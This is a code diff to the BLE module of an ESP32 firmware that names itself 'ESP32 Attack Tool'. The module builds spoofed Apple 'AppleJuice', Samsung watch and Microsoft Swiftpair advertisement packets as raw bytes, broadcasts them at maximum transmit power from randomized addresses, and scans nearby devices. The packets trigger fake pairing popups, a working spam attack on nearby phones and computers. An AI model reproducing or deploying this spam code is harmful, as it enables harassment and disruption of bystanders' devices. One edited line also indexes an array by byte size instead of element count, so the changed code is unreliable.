@@ -14,6 +14,7 @@ NimBLEScan *pBLEScan;
 
 
 LinkedList<BLEScanResult>* blescanres;
+bool bleScanRedraw = false;
 
 NimBLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
 {
@@ -53,14 +54,14 @@ NimBLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
         case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
             int randdevice = random(2);
             if (randdevice == 0) {
-                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[rand() % (sizeof(IOS1) / sizeof(IOS1[0]))],
+                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                       0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 31));
             } else if (randdevice == 1) {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[rand() % (sizeof(IOS2) / sizeof(IOS2[0]))],
+                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                       0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                       0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 23));
@@ -175,6 +176,8 @@ void BLEModules::main()
     blescanres = new LinkedList<BLEScanResult>();
       
     // Initialize NimBLE
+    //NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
+    //NimBLEDevice::setScanDuplicateCacheSize(200);
     NimBLEDevice::init("");
     pBLEScan = NimBLEDevice::getScan();
     this->ble_initialized = true;
@@ -187,9 +190,11 @@ bool BLEModules::ShutdownBLE()
 {
     if(this->ble_initialized) {
         Serial.println("[INFO] Shutting down BLE Module");
-        pAdvertising->stop();
-        pBLEScan->clearResults();
-        pBLEScan->stop();
+        if (pAdvertising != nullptr) pAdvertising->stop();
+        if (pBLEScan != nullptr) {
+            pBLEScan->stop();
+            pBLEScan->clearResults();
+        } 
         // Deinitialize NimBLE
         NimBLEDevice::deinit();
         this->ble_initialized = false;
@@ -219,12 +224,11 @@ NimBLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, ui
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
     if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
         Serial.println("[INFO] BLE Apple Spoofer Starting");
-        //uint8_t AdvData_Raw[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
-        //                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-        //                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-        //                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-        //AdvData.addData(std::string((char*)AdvData_Raw, 31));
-        AdvData.addData(std::string((char*)IOS1_1[(int)device_type], 31));
+        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
+                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        AdvData.addData(std::string((char *)packet, 31));
     } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
         Serial.println("[INFO] BLE Samsung Spoofer Starting");
         uint8_t model = watch_models[(int)device_type].value;
@@ -292,13 +296,9 @@ void BLEModules::stopSpoofer() {
 }
 
 void BLEModules::initSpam() {
-    //NimBLEDevice::init("ESP32 Attack Tool");
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, MAX_TX_POWER); 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , MAX_TX_POWER);
-
-    //NimBLEServer *pServer = NimBLEDevice::createServer();
-    //pAdvertising = pServer->getAdvertising();
 
     esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
     esp_ble_gap_set_rand_addr(null_addr);
@@ -307,9 +307,12 @@ void BLEModules::initSpam() {
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
 }
 
-
+/*
 void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
 {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
@@ -322,8 +325,9 @@ void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
     pAdvertising->start();
     vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    //NimBLEDevice::deinit();
+    NimBLEDevice::deinit();
 }
+*/
 
 void BLEModules::executeSwiftpair(EBLEPayloadType type)
 {
@@ -333,17 +337,18 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
+    vTaskDelay(40 / portTICK_PERIOD_MS);
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
-    //pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
     NimBLEDevice::deinit();
 }
 
-class AdvertisedDeviceCallbacks: public NimBLEAdvertisedDeviceCallbacks {
+class BLEScanDeviceCallbacks: public NimBLEAdvertisedDeviceCallbacks {
     void onResult(NimBLEAdvertisedDevice *advertisedDevice) {
+        bleScanRedraw = true;
         BLEScanResult bleres;
         String ble_name;
         ble_name = advertisedDevice->getName().c_str();
@@ -352,10 +357,21 @@ class AdvertisedDeviceCallbacks: public NimBLEAdvertisedDeviceCallbacks {
         bleres.rssi = advertisedDevice->getRSSI();
         bleres.addr = advertisedDevice->getAddress();
         blescanres->add(bleres);
+        String add_to_buffer;
+        if (ble_name.isEmpty()) add_to_buffer = String(bleres.addr.toString().c_str());
+        else add_to_buffer = ble_name;
+        //if (display_buffer->size() > 4)
+        //    display_buffer->shift();
+        display_buffer->add(add_to_buffer);
         Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
-        // Serial.println("\n\nAddress - " + bt_address + "Name-"+ bt_name +"\n\n");
     }
 };
+
+void BLEModules::scanCompleteCB(NimBLEScanResults scanResults) {
+    printf("[INFO] Scan complete!\n");
+    printf("[INFO] Found %d devices\n", scanResults.getCount());
+    scanResults.dump();
+  } // scanCompleteCB
 
 void BLEModules::bleScan() {
     delete blescanres;
@@ -363,21 +379,22 @@ void BLEModules::bleScan() {
     NimBLEDevice::init("ESP32 Attack Tool - BLE Utility");
     ble_initialized = true;
     pBLEScan = NimBLEDevice::getScan();
-    pBLEScan->setAdvertisedDeviceCallbacks(new AdvertisedDeviceCallbacks());
+    pBLEScan->setAdvertisedDeviceCallbacks(new BLEScanDeviceCallbacks(), false);
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(100);
     pBLEScan->setWindow(99);
+    pBLEScan->setMaxResults(0);
 
     vTaskDelay(100 / portTICK_PERIOD_MS);
     //delay(100);
 
     Serial.println("[INFO] Starting BLE Scan");
-    NimBLEScanResults foundDevices = pBLEScan->start(SCANTIME, false); // Default scan time is 5 seconds
+    pBLEScan->start(0, scanCompleteCB, false);
     
-    Serial.println("[INFO] BLE Scan Done! Found: " + String(foundDevices.getCount()) + " Devices!");
+    //Serial.println("[INFO] BLE Scan Done! Found: " + String(foundDevices.getCount()) + " Devices!");
 
-    this->ShutdownBLE();
+    //this->ShutdownBLE();
 
-    Serial.println("[INFO] BLE Scan completed successfully! Devices in list: " + String(blescanres->size()));
+    //Serial.println("[INFO] BLE Scan completed successfully! Devices in list: " + String(blescanres->size()));
 }
 
